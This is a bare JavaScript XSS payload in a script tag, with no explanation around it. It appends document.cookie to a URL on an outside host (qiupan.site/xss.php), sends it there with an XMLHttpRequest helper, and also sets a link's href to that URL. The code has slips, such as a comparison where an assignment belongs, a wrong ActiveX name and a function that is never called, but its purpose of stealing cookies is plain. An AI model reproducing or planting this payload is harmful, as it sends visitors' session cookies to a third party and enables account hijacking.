<script type="application/javascript">
    var u="http://www.qiupan.site/xss.php?"+document.cookie;
    h=function(){
        //var u="http://www.qiupan.site/xss.php?"+document.cookie;
        Ajax("GET",u);
    }
    Ajax=function(method,url){
        var xhr;
        if(window.XMLHttpRequest){
            xhr=new XMLHttpRequest();//IE7+,firefox,chrome
        }else{
            xhr=new ActiveXObject('Microsoft.XMLHttpRequest');
        }
        xhr.onreadystatechange==function(){
            if(xhr.readyState==4&&xhr.status==200){
                //访问成功的操作
                //fn.call(xhr.response);
                alert("success");
            }
        }
        xhr.param={
            "Cookie":'cookie'
        }
        xhr.open(method,url);
        xhr.send();
    }
    var a1=document.querySelector("#d");
    a1.setAttribute("href",u);
</script>
